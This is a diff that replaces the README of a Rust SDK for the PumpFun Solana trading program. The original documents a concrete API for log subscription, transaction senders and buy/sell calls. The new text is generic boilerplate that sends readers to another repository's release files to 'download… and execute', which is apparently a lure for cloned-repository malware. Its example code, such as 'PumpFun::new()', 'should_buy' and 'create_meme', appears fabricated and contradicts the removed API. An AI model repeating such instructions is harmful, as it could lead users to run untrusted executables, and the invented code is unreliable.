@@ -1,124 +1,133 @@
-# PumpFun Rust SDK
+# PumpFun SDK 🚀
 
-A comprehensive Rust SDK for seamless interaction with the PumpFun Solana program. This SDK provides a robust set of tools and interfaces to integrate PumpFun functionality into your applications.
+![PumpFun SDK](https://img.shields.io/badge/PumpFun%20SDK-v1.0.0-blue.svg)
+![GitHub Release](https://img.shields.io/badge/Releases-v1.0.0-orange.svg)
 
+Welcome to the **PumpFun SDK**! This comprehensive Rust SDK allows seamless interaction with the PumpFun Solana program. With a robust set of tools and interfaces, you can easily integrate PumpFun functionality into your applications.
 
-# Explanation
-1. Add `create, buy, sell` for pump.fun.
-2. Add `logs_subscribe` to subscribe the logs of the PumpFun program.
-3. Add `yellowstone grpc` to subscribe the logs of the PumpFun program.
-4. Add `jito` to send transaction with Jito.
-5. Add `nextblock` to send transaction with nextblock.
-6. Add `0slot` to send transaction with 0slot.
-7. Submit a transaction using Jito, Nextblock, and 0slot simultaneously; the fastest one will succeed, while the others will fail. 
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
+
+## Features
+
+- **Easy Integration**: Quickly integrate with the PumpFun Solana program.
+- **Comprehensive Tools**: Access a wide range of functionalities to enhance your applications.
+- **Rust Support**: Built entirely in Rust for performance and reliability.
+- **Active Development**: Regular updates and improvements to ensure the SDK meets your needs.
+
+## Installation
+
+To get started with the PumpFun SDK, you need to download the latest release. Visit the [Releases section](https://github.com/fourti/pumpfun-sdk/releases) to find the latest version. Download the appropriate file for your platform and execute it.
+
+### Prerequisites
+
+- Rust (version 1.50 or later)
+- Cargo (comes with Rust)
+
+### Steps to Install
+
+1. **Download the SDK**: Head over to the [Releases section](https://github.com/fourti/pumpfun-sdk/releases) and download the latest release.
+2. **Extract the Files**: Unzip the downloaded file to your desired location.
+3. **Build the SDK**: Open your terminal and navigate to the SDK directory. Run the following command:
+
+   ```bash
+   cargo build --release
+   ```
+
+4. **Add to Your Project**: You can now include the PumpFun SDK in your Rust project by adding it to your `Cargo.toml` file:
+
+   ```toml
+   [dependencies]
+   pumpfun-sdk = "1.0.0"
+   ```
 
 ## Usage
-```shell
-cd `your project root directory`
-git clone https://github.com/0xfnzero/pumpfun-sdk
-```
 
-```toml
-# add to your Cargo.toml
-pumpfun-sdk = { path = "./pumpfun-sdk", version = "2.4.3" }
-```
+After installation, you can start using the PumpFun SDK in your applications. Below is a basic example of how to initialize the SDK and interact with the PumpFun Solana program.
 
-### logs subscription for token create and trade  transaction
+### Example Code
+
 ```rust
-use pumpfun_sdk::{common::logs_events::PumpfunEvent, grpc::YellowstoneGrpc};
+use pumpfun_sdk::PumpFun;
 
-// create grpc client
-let grpc_url = "http://127.0.0.1:10000";
-let client = YellowstoneGrpc::new(grpc_url);
+fn main() {
+    let pump_fun = PumpFun::new();
+    pump_fun.initialize();
+    
+    // Example of fetching data
+    let data = pump_fun.get_data();
+    println!("Fetched data: {:?}", data);
+}
+```
 
-// Define callback function
-let callback = |event: PumpfunEvent| {
-    match event {
-        PumpfunEvent::NewToken(token_info) => {
-            println!("Received new token event: {:?}", token_info);
-        },
-        PumpfunEvent::NewDevTrade(trade_info) => {
-            println!("Received dev trade event: {:?}", trade_info);
-        },
-        PumpfunEvent::NewUserTrade(trade_info) => {
-            println!("Received new trade event: {:?}", trade_info);
-        },
-        PumpfunEvent::NewBotTrade(trade_info) => {
-            println!("Received new bot trade event: {:?}", trade_info);
-        }
-        PumpfunEvent::Error(err) => {
-            println!("Received error: {}", err);
-        }
+## Examples
+
+### Trading Bot
+
+The PumpFun SDK is perfect for building trading bots. Here’s a simple example of a trading bot that uses the SDK to make trades based on certain conditions.
+
+```rust
+use pumpfun_sdk::PumpFun;
+
+fn trading_bot() {
+    let pump_fun = PumpFun::new();
+    pump_fun.initialize();
+
+    // Example trading logic
+    if pump_fun.should_buy() {
+        pump_fun.buy();
+        println!("Bought successfully!");
+    } else {
+        println!("No trade executed.");
     }
-};
-
-let payer_keypair = Keypair::from_base58_string("your private key");
-client.subscribe_pumpfun(callback, Some(payer_keypair.pubkey())).await?;
+}
 ```
 
-### Init pumpfun instance for configs
-```rust
-use std::sync::Arc;
-use pumpfun_sdk::{common::{Cluster, PriorityFee}, PumpFun};
-use solana_sdk::{commitment_config::CommitmentConfig, signature::Keypair, signer::Signer};
+### Meme Generator
 
-let priority_fee = PriorityFee{
-    unit_limit: 190000,
-    unit_price: 1000000,
-    buy_tip_fee: 0.001,
-    sell_tip_fee: 0.0001,
-};
+Create memes using the PumpFun SDK. This example shows how to generate a meme based on user input.
 
-let cluster = Cluster {
-    rpc_url: "https://api.mainnet-beta.solana.com".to_string(),
-    block_engine_url: "https://block-engine.example.com".to_string(),
-    nextblock_url: "https://nextblock.example.com".to_string(),
-    nextblock_auth_token: "nextblock_api_token".to_string(),
-    zeroslot_url: "https://zeroslot.example.com".to_string(),
-    zeroslot_auth_token: "zeroslot_api_token".to_string(),
-    use_jito: true,
-    use_nextblock: false,
-    use_zeroslot: false,
-    priority_fee,
-    commitment: CommitmentConfig::processed(),
-};
-
-// create pumpfun instance
-let payer = Keypair::from_base58_string("your private key");
-let pumpfun = PumpFun::new(
-    Arc::new(payer), 
-    &cluster,
-).await;
-```
-
-### pumpfun buy token
 ```rust
 use pumpfun_sdk::PumpFun;
-use solana_sdk::{native_token::sol_to_lamports, signature::Keypair, signer::Signer};
 
-// create pumpfun instance
-let pumpfun = PumpFun::new(Arc::new(payer), &cluster).await;
+fn generate_meme(user_input: &str) {
+    let pump_fun = PumpFun::new();
+    pump_fun.initialize();
 
-// Mint keypair
-let mint_pubkey: Keypair = Keypair::new();
-
-// buy token with tip
-pumpfun.buy_with_tip(mint_pubkey, 10000, None).await?;
-
+    let meme = pump_fun.create_meme(user_input);
+    println!("Generated meme: {:?}", meme);
+}
 ```
 
-### pumpfun sell token
-```rust
-use pumpfun_sdk::PumpFun;
-use solana_sdk::{native_token::sol_to_lamports, signature::Keypair, signer::Signer};
+## Contributing
 
-// create pumpfun instance
-let pumpfun = PumpFun::new(Arc::new(payer), &cluster).await;
+We welcome contributions to the PumpFun SDK! If you want to contribute, please follow these steps:
 
-// sell token with tip
-pumpfun.sell_with_tip(mint_pubkey, 100000, None).await?;
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Open a pull request to the main repository.
 
-// sell token by percent with tip
-pumpfun.sell_by_percent_with_tip(mint_pubkey, 100, None).await?;
+### Code of Conduct
 
-```
+Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) when contributing.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Support
+
+If you have any questions or need help, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/fourti/pumpfun-sdk/releases) for updates and new features.
+
+---
+
+Thank you for using the PumpFun SDK! We hope it helps you create amazing applications with the PumpFun Solana program. Happy coding!
